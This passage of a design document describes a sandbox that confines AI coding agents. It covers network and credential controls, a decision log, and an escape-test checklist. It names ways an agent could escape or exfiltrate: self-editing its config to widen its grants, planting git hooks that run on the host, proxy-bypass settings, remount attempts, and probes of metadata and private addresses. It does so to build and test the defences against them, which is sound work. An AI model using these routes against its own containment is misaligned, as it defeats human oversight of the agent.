- **D29 (2026-11-02): Windows phases 2-3: executable shims, Credential Manager, SSH agents on the named pipe.** *Shims* are copies (hard links where possible) of zoo.exe named `<harness>.exe`, not `.cmd`: Node refuses to spawn .cmd/.bat without a shell since the 2024 BatBadBut fix, and Orca and Conductor are Node apps; batch files also mangle arguments. Started from the shims dir under another name, zoo acts as the shim (`shims.Invoked`) and hands off to the installed zoo recorded in a manifest (`.zoo-shims`), so an upgraded zoo is what decides how agents run, not a stale copy. `ZOO=off` and `ZOO_INSIDE` run the real CLI, found past the shims dir with PATHEXT. `zoo shims install --path` puts the dir first on the user PATH (`HKCU\Environment`, keeping REG_EXPAND_SZ) and broadcasts WM_SETTINGCHANGE; uninstall takes it out. Verified: the shim hands off with arguments and exit code intact, and `ZOO=off` reaches the real Claude Code. *Credentials* go to Credential Manager as generic credentials `zoo:<name>` (advapi32, no new dependency), split over `zoo:<name>#N` past the 2560-byte blob limit (a Codex ChatGPT `auth.json` can exceed it). Also fixed on every OS: an interactive `zoo keys set` stored an empty value outside macOS (now prompts with hidden input; the Keychain still prompts itself so the secret never reaches argv), and piped values kept a trailing `\r` on Windows. Install hints name the OS's installer (winget, brew, npm). *SSH agents* on Windows are reached at `\\.\pipe\openssh-ssh-agent`, which the OpenSSH agent service, 1Password and Bitwarden all serve, so `system`, `1password` and `bitwarden` resolve there; explicit pipe paths work too. Verified with Windows' own OpenSSH client authenticating through the proxy over named pipes, session-bind destination filtering included. The `bw`/`op` test fakes, shell scripts before, are now the test binary itself, so `go test ./...` passes natively on Windows and CI runs all of it there.
- **D30 (2026-11-02): Podman reads go through its Docker-compatible API too, and CPU% is computed from wall time.** Podman serves the same API on its service socket, so D25's event-driven daemon now covers it: found from `CONTAINER_HOST`, else on Linux the `podman.socket` service (only if it exists: `podman info` reports `Host.RemoteSocket`), else on macOS and Windows the podman machine's forwarded socket or pipe (`podman machine inspect`). Without a running service it stays on the CLI and polls, as before. Testing against real podman 5.8 found that its stats stream sends its first samples microseconds apart and fills `system_cpu_usage` differently, so the engine's precpu-based rate read 0% for a container pegging a core. CPU% is now computed from consecutive samples against our own wall clock over windows of at least 0.5 s: the same quantity `docker stats` shows (100% = one busy core) on every engine. Verified with a busy container: podman 5.8 100.0%, Docker Desktop (Windows named pipe) 100.0%; stop events in about 1.2 s on both. CI runs that check against real docker and podman (`engine-api` job, `TestRealEngineBackend`).
- **D31 (2026-11-07): `zoo.yaml` applies only once a human approves it.** It lives in the agent-writable worktree, and the daemon read `services:` live, so an agent could grant its cage any configured service (or unmask secrets / add mounts for the next cage) by editing it. The approved copy lives in `~/.zoo/trust/<hash>.json`; `zoo run` on a TTY shows a diff and asks; otherwise the approved copy stays in force with a warning; `zoo trust` approves. Deleting the file is a change too (it would drop extra masks). Rejected: mounting `zoo.yaml` read-only (the agent can still create it when absent).
- **D32 (2026-11-07): Hooks and command-running git config are reported; worktree paths they name are read-only.** `cage.HostGitRisks` lists non-sample hooks and keys like `core.fsmonitor`, `core.hooksPath`, `filter.*`, `include.path` at cage creation and in doctor (a repo can arrive with a payload: detection only). `core.hooksPath=.husky`, included config files and filter scripts that point into the worktree would run agent-written code on the host, so they're added to `ReadOnly` (a missing hooks dir is created first). Cost: husky's install step can't write `.husky/_` inside a cage.
- **D33 (2026-11-07): `git: rw | ro | none`, and several worktrees per cage.** `ro` mounts the git dir read-only; `none` covers it with an empty read-only dir (`~/.zoo/empty-dir`) and masks a linked worktree's `.git` file. `zoo.yaml mounts:` adds worktrees, each guarded by the same `guardGit` and masks; mounts can't be `/`, `$HOME`, a parent of the worktree or overlap `~/.ssh`, `~/.aws`, `~/.config`, `~/Library` and similar. Cages carry `zoo.layout` (hash of mounts and guard paths): a stopped cage whose layout changed is recreated, a running one gets a note.
- **D34 (2026-11-07): Grants and allows can expire.** `--for 30m|4h|2d` on `zoo allow` and `zoo grant`, and from the dashboard. Expiries live beside the allowlist/grants (`allow-expiry.json`, `grant-expiry.json`); an expired grant stops counting at once (LoadGrants drops it); zood (every 5 s) or the next `zoo run` removes lapsed entries and reloads squid. A temporary allow never shortens a permanent one.
- **D35 (2026-11-07): Credentials stay on the host; the keeper decrypts only their hosts.** Supersedes the TLS non-goal for hosts listed under `credentials:`. Cages get `<prefix>zoocred.<cred>.<cage>.<hmac>`; squid sends those hosts' CONNECTs to `cache_peer 127.0.0.1:3129` (an injector in zoo-gate, stdlib only), which presents a leaf from a per-install CA whose `PermittedDNSDomains` (critical) are exactly the credential hosts, checks the Host header matches the CONNECT, enforces policy (`readonly`: GET/HEAD/OPTIONS, git-upload-pack, LFS download, GraphQL without a `mutation` keyword outside strings; `push`: receive-pack commands parsed from pkt-lines, refs matched against `refs/heads/<pattern>`; `repos`: GitHub-style paths), swaps placeholders (also inside Basic auth) for values zood returns over the host bridge (`ZOO1 <token> @cred <placeholder>`: HMAC valid, cage running, grant held, value from Keychain/vault, cached 5 min in zood and 1 min in the keeper), and re-encrypts with system roots, refusing private addresses. Policy applies to every request to those hosts, with or without a credential, which also closes exfiltration through them with an attacker's token. Cages trust the CA via the system store plus `NODE_EXTRA_CA_CERTS`/`SSL_CERT_FILE`/`REQUESTS_CA_BUNDLE`; git gets a root-owned credential helper and https rewrites. Harnesses opt in with `cred:<name>` env values; built-in `claude`/`codex` definitions stay dormant until used. Rejected: squid `ssl_bump` + `request_header_add` (secrets in squid.conf, no placeholder binding, no git-aware policy); bumping everything (privacy, breaks pinned clients).
- **D36 (2026-11-07): Doctor probes private reachability; the gate checks the arrival network.** `zoo doctor --deep` scans the cage's /24 and well-known private/metadata/Tailscale addresses directly and through the keeper; `--json` emits one `{verdict,check,detail}` per line. Every run checks interfaces (only lo plus the cage's own; tunnel devices the kernel creates are allowed while down) and default routes (WARN where the host gateway is expected). `gate.json` services carry `via` (cage IP → keeper IP on that cage's network); a connection arriving on another keeper address is refused. The Docker keeper runs with `rp_filter=1`. Defence in depth: cages can't open raw sockets.
- **D37 (2026-11-07): The SSH door has no listener.** Replaces 13.3's sshd-on-the-network design: `ProxyCommand zoo ssh-proxy <cage>` runs `sshd -i` as `agent` over the backend's exec. Root-owned `/etc/zoo/{sshd_config,authorized_keys,sshd_env.conf}`; agent/X11/remote/socket forwarding refused, local forwarding allowed (editors need it); session env via `SetEnv` with no harness credentials; zoo writes `~/.zoo/ssh/config`, the user adds the `Include`.
- **D38 (2026-11-07): Previews go over exec too.** zood serves `http://[<port>.]<cage>.localhost:<preview_port>` (default port+2, loopback only, Host must name a running cage) by running socat (bash `/dev/tcp` fallback) in the cage per connection, so it works where the host can't route to cages. Listening ports come from `/proc/net/tcp{,6}` every 10 s.
- **D39 (2026-11-07): Package caches per cage by default; shared only by choice, and read-write.** `~/.zoo/cache/project/<cage>` mounted rw at `/home/agent/.zoo-cache`, surviving `zoo reset`; `cache: shared` mounts one dir into every cage that opts in, read-write (package managers can't use a read-only cache), with a warning at creation that one cage can poison another's installs. Supersedes "shared caches read-only" in 4 and 10.2. Tools are pointed at it by session env only for cages labelled `zoo.cache`. Rejected: mounting the host's own caches (I5); one shared cache by default.
- **D40 (2026-11-07): Bring-your-own images are an overlay on the user's image; Dockerfiles build only once approved, with an empty context.** The overlay continues the user's final stage (some builders can't see local intermediate images). The tag hashes base, Dockerfile, overlay sources, uid/gid and zoo's cage tag; the `zoo.image` check recreates stopped cages. Approval stores the Dockerfile's hash and content per worktree; a change keeps the old image until `zoo build --project`. Rejected: building with the worktree as context (bakes in masked secrets) and auto-building on change (RUN steps have network outside the keeper).
- **D16 (2026-10-28): `zoo up --backend X --isolation-floor Y` is remembered in `~/.zoo/state.json`** so later commands and the daemon agree; a plain `zoo up` clears the remembered floor. Precedence: flag > env (`ZOO_BACKEND`, `ZOO_ISOLATION_FLOOR`) > config `backend` (non-auto) > remembered > auto; floor: flag > env > remembered > config.

- **D41 (2026-11-10): Broker supported model credentials by default.** Claude tokens and Codex API keys use keeper placeholders. Codex API mode writes placeholder auth JSON and takes precedence over subscription auth. Subscription auth remains an explicit direct-file fallback. User harness overrides remain supported.
- **D42 (2026-11-10): Disposable tasks use separate copies and host-owned review data.** Only the work copy enters the cage. A fresh baseline excludes source Git metadata, ignored files, and masks. Apply produces unstaged edits and rejects conflicts with changed host files. A saved patch and pending baseline record support interrupted-apply recovery. Tasks retain approved source policy, reject extra mounts, and use private caches. Source history, submodules, and commit transfer are outside this first version.
- **D43 (2026-11-10): Project web policies replace the global allowlist.** Omitted `network.allow` inherits the global list; an explicit empty list denies all web destinations. Only approved configuration supplies rules. Squid checks source address and destination after private-address and port denials. Unknown addresses fail closed after policy synchronization. Docker network creation failure never falls back to a shared cage network. Existing proxy connections require a cage restart for immediate revocation.
- **D44 (2026-11-10): Persist recent web activity with an atomic JSON checkpoint.** Save events, original cage attribution, alerts, counters, sessions, and the log cursor together. Keep 5,000 events and 500 alerts. Resume from a complete log line and detect log replacement by a suffix check. This is an incremental restart-recovery feature, not completion of the SQLite store milestone. Resource samples and service/signature events remain outside this checkpoint.

- **D45 (2026-11-10): Credential delivery checks live cage state and retries denials.** The first request can precede daemon polling. Inspect the runtime before releasing a key, and fail closed if inspection fails. The keeper caches successful lookups only. Bridge errors give a specific reason. The keeper image moves to m5. A real Docker check with a synthetic key reproduced the startup denial and passed after this fix.

---

## 16. Testing strategy

### 16.1 Layers

- **Unit:** pure logic (allowlist, parsing, planning, normalization, AG-UI mapping, rules). `go test ./...` must stay under 30 s.
- **Fake backends:** scriptable fakes for each CLI (pattern: `ZOO_CONTAINER_BIN` pointing at a Python/Go fake keeping JSON state) to test orchestration end to end without hardware. Keep the v0 fake as `test/fakes/container` and add `test/fakes/docker`.
- **Contract suite** (`internal/backend/contract`): one table of behaviors every backend must satisfy (create/start/stop/delete/list/exec/write-file/sample, network isolation flags, labels round-trip). Runs against fakes in CI and real backends where available.
- **Escape suite** (16.3): proves invariants on a real backend.
- **Dashboard:** component tests for the React UI (M7+); a Playwright smoke test against a zood seeded with synthetic data (CI only).
- **Golden files:** squid.conf rendering, AG-UI streams, alert payloads.

### 16.2 CI

- GitHub Actions: `ubuntu-latest` runs unit + fakes + docker backend e2e (Docker available) + escape suite with `isolation_floor: container`.
- Optional self-hosted runners: macOS 26 (Apple backend), Linux with KVM (Kata), k3s (k8s backend). Mark these jobs optional until the human provides runners.

### 16.3 Escape suite (extends `zoo-doctor`)

Run inside a cage as the agent user unless noted. Expected result in parentheses.

1. Direct egress to an IP literal, HTTPS and raw TCP (fail).
2. DNS resolution of an external name; raw UDP 53 to 1.1.1.1 and 8.8.8.8 (fail).
3. Via keeper, allowlisted host (succeeds, logged with correct cage/agent).
4. Via keeper, non-allowlisted host (403, logged, alert raised).
5. Via keeper, port other than 80/443 (denied).
6. Proxy-bypass attempts: `NO_PROXY=*`, unsetting env, `--noproxy` (fail: no route).
7. Masked files read empty; unmask attempts (`umount`, `mount -o remount,rw`) fail as agent; as guest root, note result per backend.
8. `.git/hooks` and `.git/config` not writable.
9. No host paths visible: `/Users`, `/home/<hostuser>` (other than worktree), Docker socket, host env vars (`env` shows only zoo-set vars).
10. Resource limits: `nproc` = size CPUs; memory limit enforced (allocate > limit → OOM in cage, host fine); fork bomb capped by pid limit.
11. Dashboard unreachable from the cage (port 7777 on gateway and keeper IPs).
12. Other cages unreachable (different cage groups).
13. Host gateway port scan: report open ports (WARN, not FAIL, on Apple; FAIL on backends that claim `HostGatewayReachable=false`).
14. (M5) Agent A can't read agent B's home/credentials.
15. (M8) Sensor: `execve` of `curl` observed; killing sensor as root raises alert.
16. No interfaces besides lo and the cage's own; no VPN/tun/wg/tailscale/zt (fail). No default route (fail; WARN on Apple).
17. (`--deep`) Lateral scan of the cage's /24 (fail on per-cage networks; WARN on Apple).
18. (`--deep`) Direct to 169.254.169.254, 100.100.100.100, common LAN gateways (fail).
19. (`--deep`) Through the keeper to metadata, loopback, `[::1]`, RFC1918, host.docker.internal, metadata.google.internal (403 or no connection).
20. Gate: a granted IP arriving on the wrong keeper address is denied and logged (unit); Docker keeper has rp_filter=1.
21. Credential hosts: TLS through the keeper verifies against the cage's trust store (the keeper CA); `git: ro`/`none` hold.

Output format stays `PASS|FAIL|WARN <check>: <detail>`; `zoo doctor --json` for CI.

---

## 17. Engineering conventions

- Go ≥ 1.24, modules, `gofmt`, `go vet`, `staticcheck` in CI. No cgo unless justified (DuckDB may require it; if so, cross-compile via goreleaser with zig or choose SQLite pure-Go `modernc.org/sqlite`, and log the decision).
- Dependencies: prefer stdlib. Current: `github.com/goccy/go-yaml`. Add a dep only with a one-line justification in the commit message.
- Errors: actionable, one line, say what to do next (`… needs macOS 26+; on older macOS use --backend lima`).
- Logging: zood logs JSON lines to `~/.zoo/daemon.log` (rotate at 10 MB × 3). Never log secrets, env files, or proxy credentials. Redact `-e KEY=VALUE` in errors (already in `ctr.redact`).
- Files: everything zoo writes lives under `~/.zoo` (or `ZOO_HOME`); 0700 dirs, 0600 secrets, keeper log dir 0777 only because the keeper writes it from another uid (document).
- Security review checklist for every PR touching cages/keeper/daemon: invariants I1–I12 still hold; escape suite still passes; no new host→cage mounts; no new listening ports reachable from cages; no secrets in argv/logs.
- UX copy: plain words, specific numbers, no jargon in user-facing messages; README updated with every user-visible change.
- Backward compatibility: `~/.zoo` layout and `zoo.yaml` keys are user-facing; migrate, don't break.

---

## 18. Open questions

Answer from evidence when you can; otherwise ask the human (see section 1).

1. **Push default:** still "agents commit, you push" by default. Since D35 a `credentials:` entry can allow pushes to listed branches (`push: ["agent/*"]`) without the token entering the cage.
2. **Apple `container` details:** answered for 1.6.1 in 6.4 and D11/D12 (list and inspect share one shape: `.id`, `.status.state`, `.configuration.labels`, `.status.networks[].{network,ipv4Address "x/24"}`; `--mount` rejects files, `-v` takes them; no CAP_SYS_ADMIN by default; keeper IP not stable). Open: vsock.
3. **Docker internal networks:** OrbStack 29.8.2: embedded DNS answers container names but not external ones (SERVFAIL), with or without `--dns`; zoo still sets `--dns 127.0.0.1`. No default route. The internal network's gateway IP answers (RST) but leads only into the runtime's VM, not the Mac. `--ip` works on internal networks without `--subnet` (keeper pinning possible later). Linux Engine 28 (CI): the internal bridge's gateway address is the host itself, so host services on 0.0.0.0 (sshd) were reachable from cages; zoo now creates internal networks with `com.docker.network.bridge.inhibit_ipv4=true` (no host address; cages and the keeper need no gateway). Open: Docker Desktop, Podman/netavark (no equivalent option).
4. **Conductor PATH:** does it inherit the login shell PATH so shims catch it, or need an explicit agent path?
5. **Orca:** can `orca.yaml` launch agents through `zoo`? How is remote SSH configured?
6. **Store:** DuckDB (cgo) vs SQLite pure-Go for cross-compilation simplicity.
7. **Per-agent proxy auth:** do all target harnesses honor credentials in `HTTPS_PROXY`?
8. **Shared caches:** see the caches decision (per-project by default, shared opt-in).
9. **k8s worktree model:** clone-in-PVC + `zoo pull` vs syncing a working copy.
10. **Name:** check `zoo` collisions before publishing.

---

## 19. Status tracker

### 19.1 Checklist

**v0 (done, tested against fakes)**
- [x] Apple backend via `container` CLI (create, start, exec, list, stats, stop, delete)
- [x] Keeper VM (squid) on two networks; allowlist; reload (learn mode removed in D24)
- [x] Cage planning: worktree root, git worktree dirs, masks, read-only git paths, sizes
- [x] Keychain credentials; env-file injection; file injection via stdin
- [x] Shims with `ZOO=off`
- [x] Daemon: log tail + backfill, stats, sessions, alerts (deny, bytes-out), ntfy, SSE, guarded API
- [x] Dashboard v0: cages, alerts, live feed with search/filters/pause/allow
- [x] `zoo doctor` (in-cage checks + host checks)
- [x] README, Makefile, unit tests, fake-CLI e2e

**M0: Harden v0 on Apple**
- [x] Verify 6.4 items on real hardware (container 1.6.1, macOS 27.0.1); all but harness proxy behavior (needs tokens). See 6.4.
- [x] Exact stats field names; heuristics kept as fallback (list/inspect still via jsonx, works on 1.6.1)
- [x] `zoo status`
- [x] `zoo-init` capability detection and clear failure
- [ ] Gate passes on real hardware: `zoo doctor` all PASS (host-exposure WARN) in a main checkout and a linked worktree ✓; the `zoo run claude -- -p …` part needs a Claude token (`needs-human`)

**M1: Backend interface + docker**
- [x] `internal/backend` interface; Apple moved behind it
- [x] Docker/Podman driver with host-side masks and hardening flags (escape suite PASS on OrbStack 29.8.2; podman untested: no machine)
- [x] Isolation levels, `isolation_floor`, badges (I12)
- [x] `zoo backend`
- [x] Contract suite + fakes (`internal/backend/contract`, `test/fakes/fakectr`: apple 1.6.1 and docker 29 dialects, podman via docker dialect)
- [x] Linux CI gate: GitHub Actions ubuntu-latest, Docker 28; escape suite PASS in main checkout and linked worktree (after D23)

**M2: Allowlist layers, gc, first-seen**
- [ ] Per-cage squid ACLs from global ∪ harness ∪ project
- [ ] Rule provenance; dashboard scope choice; CLI flags
- [ ] `zoo gc`
- [ ] First-seen alerts
- [ ] Gate

**M2S: Services, grants, SSH agent, secret sources**
- [x] Services config + grants (CLI, zoo.yaml, grants.json)
- [x] Gate in keeper image + gate.json sync + gate log ingest
- [x] Host bridge in zood (apple: verified keeper-only reachability; docker/OrbStack: e2e)
- [x] Sidecars on `zoo-services`
- [x] SSH agent proxy (key scoping, destination check, approval, logging); tested with real OpenSSH
- [x] Secret sources: Bitwarden CLI, 1Password CLI (tested against fake CLIs; owner has neither CLI installed)
- [x] Per-cage networks on docker (lateral traffic: "Network is unreachable")
- [x] Dashboard: services, grants, connections, signs, approvals; minimal visual refresh
- [x] Gate: passes on OrbStack and Apple 1.6.1 (host service on 127.0.0.1, sidecar, github.com:22, agent filtering, approvals on OrbStack, ungranted cage refused, escape suite PASS)

**Thread pass (2026-11-07): feedback from other sandbox builders**
- [x] `zoo.yaml` trust (D31)
- [x] Hooks/config scan; worktree hook paths read-only (D32)
- [x] `git: rw|ro|none`; `mounts:` (D33)
- [x] Expiring grants and allows (D34)
- [x] Credentials in the keeper; GitHub readonly/push/repos policy (D35). Unit-tested with a real TLS round trip; e2e on Docker: see changelog
- [x] Doctor `--deep`/`--json`, interface check, gate anti-spoofing (D36)
- [x] SSH door (D37): `needs-hw-verify` on Apple; Orca remote mode untested
- [x] Previews (D38): Docker verified by agent with a throwaway container; Apple untested
- [x] Package caches (D39), your own image (D40): overlay test-built on debian, python, alpine, node; real cage creation pending e2e
- [x] Release: goreleaser, Homebrew tap, deb/rpm, cosign, provenance (human: tap repo, `HOMEBREW_TAP_TOKEN`, LICENSE)

**M3: Store, service, API v1**
- [ ] Store + retention + backfill
- [ ] launchd/systemd service
- [ ] `zoo logs`, `zoo resize`
- [ ] Alerts view with ack; search prefixes; time ranges
- [ ] Gate (persistence, 100k events perf)

**M4: Files + resource history**
- [ ] File watcher + alerts
- [ ] Resource history + limit alerts + disk limits
- [ ] Gate

**M5: Shared cages, per-agent identity**
- [ ] Per-agent users/homes/creds/cgroups
- [ ] Proxy auth per agent; per-agent overrides
- [ ] Gate

**M6: SSH door + Docker-in-cage**
- [x] sshd per cage + ssh-config (D37: over exec, no listener)
- [ ] Orca remote mode guide
- [ ] Docker-in-cage on vm/microvm
- [ ] Gate

**M7: OTel + AG-UI + React**
- [ ] OTLP receiver; Claude Code + Codex adapters
- [ ] AG-UI translator + endpoint
- [ ] React dashboard at parity + Sessions view
- [ ] Gate

**M8: Guest sensor + rules**
- [ ] zoo-sensor (Tetragon/eBPF), transport, heartbeat
- [ ] Correlation rules
- [ ] Gate

**M9: k8s + Lima**
- [ ] k8s backend, Helm chart, sync/pull, in-cluster auth
- [ ] Lima backend
- [ ] Gate

**M10: Linux microVM runtimes**
- [ ] Kata/runsc detection + selection
- [ ] (optional) Firecracker driver with decision log entry
- [ ] Gate

**M11: Release**
- [x] goreleaser, tap, signing (keyless cosign in CI); images (human)
- [ ] Integration guides; SECURITY.md
- [ ] Name check (human)
- [ ] Gate

### 19.2 Changelog

- 2026-11-10: Disposable tasks, default model credential brokering, project web policies, fail-closed Docker networks, and persistent web history (D41–D44). Cage image moves to m5 for policy-aware doctor probes. Real Docker deep escape, task lifecycle, policy, restart-history, and synthetic credential checks passed. The startup credential race is fixed in D45; keeper image moves to m5. Results are in `docs/disposable-work-progress.md`. Apple checks and authenticated model generation remain unverified.

- 2026-10-28: v0 built (Apple backend, squid keeper, daemon, static dashboard, doctor, shims). Tested against a fake `container` CLI.
- 2026-10-28: M0 verified on container 1.6.1. Fixed: in-guest masks/git guard silently failed (no CAP_SYS_ADMIN); squid -k reconfigure failed (squid was PID 1); `.git` rename bypassed the git guard; linked-worktree `.git` file and `commondir` were writable; IP-keyed learn mode leaked across cages on IP reuse; squid matched IP-literal CONNECTs by PTR name (now `dstdomain -n`).
- 2026-10-28: M2S: services (host, sidecar, remote, ssh-agent), grants, gate, host bridge, SSH agent proxy, Bitwarden/1Password secret sources, per-cage networks on docker, dashboard refresh. Fixed: squid stale pid file wedged keeper restarts.
- 2026-10-28: M1: `internal/backend` with `apple`, `docker`, `podman`; host-side guard on all backends; isolation floor; `zoo backend`, `zoo status`; escape suite PASS on OrbStack and Apple.
- 2026-11-07: Thread pass (D31–D40): zoo.yaml trust; git risk scan and guarded hook paths; `git:` modes; multi-worktree cages; expiring grants/allows; credential injection with GitHub policy; doctor `--deep`/`--json`, interface check, gate `via` + rp_filter; SSH door over exec; preview URLs; package caches; bring-your-own images; release packaging. Images bumped to m4.
- 2026-11-02: Red-team pass (D24): learn mode removed (`zoo blocked` instead); keeper refuses private destinations; git guard extended to all worktrees and submodules; host-side planted-repository detection in run, daemon and doctor. Squid config verified on bookworm squid; Linux unit and contract tests pass. Escape suite on Apple not yet re-run.
- 2026-11-02: Windows phase 1 (D26): zoo builds and runs on Windows with Docker Desktop; path mapping, rewritten git pointers, safe.directory and autocrlf in cages, separator-safe guard checks, LF image sources. The first live run froze the desktop with console windows; fixed by D25 (Engine API, events, hidden console). Windows unit job in CI. Escape suite on Windows run by hand: all walls hold.
- 2026-11-02: Branch-move reporting (D27) and mask gaps (D28), from the red-team review. Both covered by the Docker escape suite in CI (a branch moved in a cage is reported with its undo; a secret in `.next/standalone` added mid-session is hidden after restart).
- 2026-11-02: Windows phases 2-3 (D29): exe shims with `--path`, Credential Manager, SSH agents on the Windows pipe; the whole test suite runs natively on Windows in CI.
- 2026-11-02: Podman on the engine API (D30); CPU% from wall time; `engine-api` CI job against real docker and podman.

---

## 20. Appendix: reference facts

### 20.1 Apple `container` CLI (documented, main branch, Oct 2026)

- `container run [--name] [-c cpus] [-m mem] [-v src:dst] [--mount type=…,source=…,target=…,readonly] [-e K=V] [--env-file f] [--network name[,mac=…][,mtu=…]] [-d] [--rm] [-i] [-t] [-u user] [-w dir] [--dns ip] [--no-dns] [-p host:ctr] [-l k=v] [--read-only] image [args]`
- `container network create [--internal] [--label] [--subnet] [--subnet-v6] name` (macOS 26+). `--internal` = host-only.
- `container list [--all] [--format json]`, `container inspect <id>` (JSON), `container stop [-s sig] [-t secs]`, `container delete [--force]`, `container exec [-d] [-e] [--env-file] [-i] [-t] [-u] [-w] id cmd…` (exec `-e` requires `K=V`), `container build [-t tag] [-f file] [dir]`, `container image list --format json`, `container system start|status`, `container stats [--format json] [--no-stream] [ids]`.
- Networks are isolated from each other; containers can attach to multiple networks.
- Default VM size 1 GiB RAM, 4 CPUs (overridden by zoo sizes).
- Host gateway reachable from internal networks; `pf` doesn't filter vmnet-bridged traffic (apple/container#1320).

Sources: [command reference](https://github.com/apple/container/blob/main/docs/command-reference.md), [networking](https://github.com/apple/container/blob/main/docs/networking.md), [#1320](https://github.com/apple/container/issues/1320).

### 20.2 Claude Code telemetry

`CLAUDE_CODE_ENABLE_TELEMETRY=1`; exporters `OTEL_METRICS_EXPORTER`, `OTEL_LOGS_EXPORTER`, `OTEL_TRACES_EXPORTER` (traces need `CLAUDE_CODE_ENHANCED_TELEMETRY_BETA=1`); `OTEL_EXPORTER_OTLP_PROTOCOL`, `OTEL_EXPORTER_OTLP_ENDPOINT`. Content opt-ins: `OTEL_LOG_USER_PROMPTS`, `OTEL_LOG_ASSISTANT_RESPONSES`, `OTEL_LOG_TOOL_DETAILS`, `OTEL_LOG_TOOL_CONTENT`, `OTEL_LOG_RAW_API_BODIES`. Every event has `session.id`, `prompt.id`, `event.sequence`. Source: [Claude Code monitoring docs](https://code.claude.com/docs/en/monitoring-usage.md).

### 20.3 Codex telemetry

`~/.codex/config.toml`: `[otel]` (`environment`, `log_user_prompt`), `[otel.exporter.otlp-http]`, `[otel.trace_exporter.otlp-http]`, `[otel.metrics_exporter.otlp-http]` each with `endpoint`, `protocol`, `headers`. Events include `codex.user_prompt`, `codex.tool_result`, `codex.websocket_request`, `codex.sse_event`. Source: [Last9 Codex integration](https://last9.io/docs/integrations/codex/).

### 20.4 AG-UI event types

`RUN_STARTED`, `RUN_FINISHED`, `RUN_ERROR`, `STEP_STARTED`, `STEP_FINISHED`, `TEXT_MESSAGE_START`, `TEXT_MESSAGE_CONTENT`, `TEXT_MESSAGE_END`, `TEXT_MESSAGE_CHUNK`, `TOOL_CALL_START`, `TOOL_CALL_ARGS`, `TOOL_CALL_END`, `TOOL_CALL_CHUNK`, `TOOL_CALL_RESULT`, `REASONING_START`, `REASONING_END`, `REASONING_MESSAGE_START`, `REASONING_MESSAGE_CONTENT`, `REASONING_MESSAGE_END`, `REASONING_MESSAGE_CHUNK`, `REASONING_ENCRYPTED_VALUE`, `STATE_SNAPSHOT`, `STATE_DELTA`, `MESSAGES_SNAPSHOT`, `ACTIVITY_SNAPSHOT`, `ACTIVITY_DELTA`, `RAW`, `CUSTOM`, `META_EVENT`. Source: [AG-UI events](https://docs.ag-ui.com/sdk/java/core/events).

### 20.5 Owner's environment (for testing priorities)

- MacBook Pro, Apple M5 Pro (18 cores), 64 GB RAM, macOS 27.0.1, Xcode 27.1.
- Installed: OrbStack, Docker Desktop, VMware Fusion, Little Snitch, Orca, Conductor, Ghostty.
- Homelab: Proxmox (target for k3s + Kata).
- Uses Claude Code and Codex; orchestrates with Conductor, herdr, Orca.

### 20.6 Default allowlist

```
api.anthropic.com  console.anthropic.com  statsig.anthropic.com  claude.ai
api.openai.com  auth.openai.com  chatgpt.com
github.com  api.github.com  codeload.github.com  objects.githubusercontent.com  raw.githubusercontent.com
registry.npmjs.org  pypi.org  files.pythonhosted.org  proxy.golang.org  sum.golang.org
```
